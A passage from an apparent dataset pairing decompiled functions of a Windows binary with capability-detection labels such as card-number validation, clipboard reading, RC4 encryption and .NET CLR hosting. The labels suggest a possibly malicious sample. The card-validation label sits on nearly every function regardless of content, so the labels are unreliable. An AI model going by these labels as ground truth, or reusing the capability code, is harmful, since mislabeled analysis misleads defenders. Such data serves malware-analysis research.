        "decompiled_code": "\nuint32_t fcn.0047c320(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint8_t uStack520;\n    \n    uVar1 = fcn.00404518();\n    while (uVar2 = uVar1,  uVar1 != 0) {\n        fcn.00404520();\n        fcn.00404520();\n        bVar3 = uStack520 == 0xffffffff;\n        uVar2 = fcn.00403a3c();\n        if (bVar3) break;\n        uVar1 = fcn.004045cc();\n    }\n    return uVar2 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 162
    },
    "0047ca28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047ca28(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    sub.user32.dll_GetCursorPos(auStack12);\n    iVar1 = fcn.0045d4bc();\n    if (iVar1 != *(in_EAX + 0x48)) {\n        *(in_EAX + 0x48) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0047cfd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047cfd0(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack12 [8];\n    \n    fcn.0047ce88();\n    if (*(in_EAX + 0x89) == '\\0') {\n        sub.user32.dll_GetCursorPos(auStack12);\n        fcn.0047d31c();\n    }\n    else if (*(in_EAX + 0x89) == '\\x01') {\n        fcn.0047d008();\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0047dc40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047dc40(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 0xc) = 0;\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x28) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 237
    },
    "0047e0a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write clipboard data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e0a8(uint dwBytes)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t in_EDX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hMem;\n    uint var_4h;\n    \n    puStack28 = 0x47e0c3;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x47e17a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = dwBytes;\n    uStack44 = 0x2002;\n    puStack48 = 0x47e0dc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_GlobalAlloc();\n    uStack52 = 0x47e14c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack64 = 0x47e0f6;\n    uStack60 = uVar1;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_GlobalLock();\n    uStack68 = 0x47e13b;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.004030ec();\n    fcn.0047dfe4();\n    uVar2 = in_EDX & 0xffff;\n    sub.user32.dll_SetClipboardData(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    uStack72 = 0x47e142;\n    sub.kernel32.dll_GlobalUnlock(uVar1);\n    return;\n}\n",
        "token_count": 478
    },
    "0047e238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.0047e238(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t *in_EAX;\n    uint arg_8h;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x47e24f;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x47e2e0;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while( true ) {\n        if (uVar2 == 0) {\n            fcn.0040dab4();\n            fcn.00404eb4();\n            *in_FS_OFFSET = uStack40;\n            uStack32 = 0x47e2e7;\n            uStack36 = 0x47e2df;\n            (**(*in_EAX + 0x14))();\n            return;\n        }\n        cVar1 = fcn.0042acb0();\n        if (cVar1 != '\\0') break;\n        uStack40 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    sub.user32.dll_GetClipboardData(uVar2);\n    arg_8h = sub.user32.dll_GetClipboardData(9);\n    fcn.0042abc0(arg_8h);\n    fcn.00404f60();\n    return;\n}\n",
        "token_count": 385
    },
    "0047e578": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047e578(uint param_1, uint32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x47e58c;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x47e5bc;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData();\n    *in_FS_OFFSET = param_2 & 0xffff;\n    uStack24 = 0x47e5c3;\n    uStack28 = 0x47e5bb;\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 218
    },
    "0047e8b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047e8b0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 0x104) = 0;\n    fcn.0047eb20();\n    *(in_EAX + 0x15c) = 1;\n    *(in_EAX + 0x15e) = 1;\n    *(in_EAX + 0x160) = 0x5622;\n    *(in_EAX + 0x164) = 0x5622;\n    *(in_EAX + 0x168) = 1;\n    *(in_EAX + 0x16a) = 8;\n    *(in_EAX + 0x16c) = 0x81;\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1df) = 1;\n    *(in_EAX + 0x1e1) = 0x5622;\n    *(in_EAX + 0x1e5) = 0x5622;\n    *(in_EAX + 0x1e9) = 1;\n    *(in_EAX + 0x1eb) = 8;\n    *(in_EAX + 0x1ed) = 0x81;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 398
    },
    "0047e98c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e98c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(arg_8h + -4);\n    *(iVar1 + 0x108) = 0x54;\n    *(iVar1 + 0x10c) = 0;\n    *(iVar1 + 0x110) = 0;\n    *(iVar1 + 0x114) = *(*(arg_8h + -4) + 0xf0);\n    *(iVar1 + 0x118) = *(*(arg_8h + -4) + 0xf8);\n    *(iVar1 + 0x11c) = 0;\n    *(iVar1 + 0x120) = 0;\n    *(iVar1 + 0x124) = *(*(arg_8h + -4) + 0xf4);\n    *(iVar1 + 0x128) = *(*(arg_8h + -4) + 0xfc);\n    *(iVar1 + 300) = 0;\n    *(iVar1 + 0x130) = 0;\n    return;\n}\n",
        "token_count": 253
    },
    "0047e9fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047e9fc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_4h;\n    \n    *(in_EAX + 0x100) = 1;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    iStack40 = in_EAX + 0x1dd;\n    iStack44 = in_EAX + 0x15c;\n    uStack48 = 0;\n    iStack52 = in_EAX + 0x104;\n    uStack56 = 0x47ea3a;\n    sub.msacm32.dll_acmStreamOpen();\n    uStack56 = 0;\n    iStack60 = in_EAX + 0xfc;\n    uStack64 = *(in_EAX + 0xf8);\n    uStack68 = *(in_EAX + 0x104);\n    puStack72 = 0x47ea5e;\n    sub.msacm32.dll_acmStreamSize();\n    puStack72 = 0x47ea6c;\n    uVar1 = fcn.00402ef0();\n    *(in_EAX + 0xf0) = uVar1;\n    puStack72 = 0x47ea83;\n    uVar1 = fcn.00402ef0();\n    *(in_EAX + 0xf4) = uVar1;\n    uStack76 = 0x47eac5;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.0047e98c(&stack0xfffffffc);\n    uVar1 = *(in_EAX + 0x104);\n    sub.msacm32.dll_acmStreamPrepareHeader(uVar1, in_EAX + 0x108, 0);\n    *in_FS_OFFSET = uVar1;\n    *(in_EAX + 0xec) = 1;\n    return;\n}\n",
        "token_count": 557
    },
    "0047ec00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047ec00(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.0047ec64();\n    }\n    iVar1 = fcn.0047ec68();\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030ec();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0047edf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047edf0(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 68
    },
    "0047efa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047efa0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 0xc) = 0x2000;\n    *(in_EAX + 0x94) = 0;\n    uVar2 = 0x47f204;\n    uVar1 = fcn.0047eec4(0x47f204, in_EAX);\n    *(in_EAX + 0x98) = uVar1;\n    *(in_EAX + 0x91) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 275
    },
    "004802dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004802dc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x48037f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00421554();\n    fcn.00420be4();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 185
    },
    "00480424": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00480424(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4804c5;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00421554();\n    fcn.00420be4();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 186
    },
    "0048055c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048055c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4805cf;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.0042147c();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 151
    },
    "004807bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004807bc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x480866;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00421554();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 184
    },
    "00480a24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00480a24(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x480a97;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.0042147c();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 151
    },
    "00480c6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00480c6c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x480cdf;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.0042147c();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 151
    },
    "00480e4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00480e4c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x480ebf;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.0042147c();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 152
    },
    "00481094": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00481094(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x4810a6;\n    fcn.004058ec();\n    uStack20 = 0x4810d9;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(param_2);\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x4810e0;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 190
    },
    "004810e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004810e4(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4810fd;\n    fcn.004058ec();\n    uStack24 = 0x481140;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0040a49c(param_2);\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack28 = 0x481147;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 202
    },
    "0048114c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "set file attributes",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048114c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint32_t arg_ch;\n    uint32_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    bool bVar3;\n    uint32_t uStack560;\n    uint32_t uStack556;\n    uchar *puStack552;\n    uint32_t uStack532;\n    uint uStack528;\n    uchar *puStack524;\n    uint32_t uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack524 = &stack0xfffffffc;\n    var_1e8h = 0;\n    var_1e4h = 0;\n    var_1e0h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    puStack512 = 0x481186;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack512 = 0x48118e;\n    fcn.004058ec();\n    uStack516 = 0x481393;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    uStack528 = 0x481357;\n    uStack532 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdec;\n    puStack512 = &stack0xfffffffc;\n    fcn.0040546c();\n    fcn.00480138();\n    fcn.00405738();\n    fcn.00403760();\n    fcn.0040ee40(&fcn.0048114c::var_1e4h, *0x4813c0);\n    fcn.00405504();\n    arg_ch = *0x4813c0;\n    puStack552 = 0x48122e;\n    fcn.0040ee40(&fcn.0048114c::var_1e8h, arg_ch);\n    puStack552 = 0x48123c;\n    fcn.00405504();\n    uStack556 = 0x481285;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    puStack552 = &stack0xfffffffc;\n    fcn.00480138(0x80);\n    fcn.00405738();\n    uVar2 = fcn.004058fc();\n    sub.kernel32.dll_SetFileAttributesA();\n    bVar3 = true;\n    *in_FS_OFFSET = uVar2;\n    uStack560 = 0x48129c;\n    fcn.00405894();\n    if (!bVar3) {\n        uStack560 = 0x4812a9;\n        fcn.004034e4();\n        uStack560 = 0x4812ae;\n        fcn.0040304c();\n        while( true ) {\n            uStack560 = 0x4812f1;\n            fcn.00403aac();\n            uStack560 = 0x4812f6;\n            cVar1 = fcn.0040304c();\n            if (cVar1 != '\\0') break;\n            uStack560 = 0x4812be;\n            fcn.00403cb4();\n            uStack560 = 0x4812c9;\n            fcn.00403d20();\n            uStack560 = 0x4812ce;\n            fcn.0040304c();\n            uStack560 = var_ch;\n            uStack556 = 0x4813cc;\n            fcn.00405800(uVar2, var_10h);\n        }\n        uStack560 = 0x481305;\n        fcn.00403908();\n        uStack560 = 0x48130a;\n        fcn.0040304c();\n    }\n    uStack560 = 0x481315;\n    fcn.00405738();\n    uStack560 = 0x481320;\n    fcn.004034f0();\n    uStack560 = 0x481325;\n    fcn.0040304c();\n    uStack560 = 0x481333;\n    fcn.00405bf0();\n    uStack560 = 0x481338;\n    fcn.0040409c();\n    uStack560 = 0x48133d;\n    fcn.0040304c();\n    uStack560 = 0x481348;\n    fcn.00403908();\n    uStack560 = 0x48134d;\n    fcn.0040304c();\n    *in_FS_OFFSET = uStack556;\n    *in_FS_OFFSET = arg_ch;\n    fcn.00405490();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1106
    },
    "00481804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00481804(void)\n\n{\n    sub.winmm.dll_mciSendStringA(0x481814, 0, 0);\n    return;\n}\n",
        "token_count": 37
    },
    "00482014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00482014(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.004046f4();\n    if (cVar1 == '\\0') {\n        cVar1 = sub.ole32.dll_IsEqualGUID(arg_ch, *(*(arg_8h + 4) + 0x30) + 0x20);\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            fcn.004046f4();\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 173
    },
    "00481fe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00481fe8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 8) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00482980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00482980(void)\n\n{\n    int32_t *piVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack28;\n    uint uStack24;\n    uchar *puStack20;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    puStack20 = 0x482994;\n    fcn.004058ec();\n    uStack24 = 0x4829f4;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00405dc8();\n    fcn.00482674(0, var_8h);\n    piVar1 = var_ch;\n    (**(*var_ch + 0x4c))();\n    fcn.0040704c();\n    *in_FS_OFFSET = piVar1;\n    fcn.00406f3c(0x4829fb);\n    fcn.00405c48();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 257
    },
    "00482d88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00482d88(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x482da2;\n    fcn.004058ec();\n    var_10h = 0x482ebd;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00482d88::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.00406f3c();\n    fcn.00482674(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040704c();\n    fcn.00406f54();\n    piVar3 = fcn.00406f3c();\n    uVar2 = fcn.00405c48();\n    fcn.00482674(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040704c();\n    fcn.00405dc8(piVar1);\n    fcn.00482674(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040704c();\n    fcn.00406f54();\n    fcn.004063bc(0, var_8h, 0x482ec8, var_ch);\n    *in_FS_OFFSET = piVar3;\n    fcn.00406f3c(0x482ec4);\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00405c48();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 602
    },
    "00482ed4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
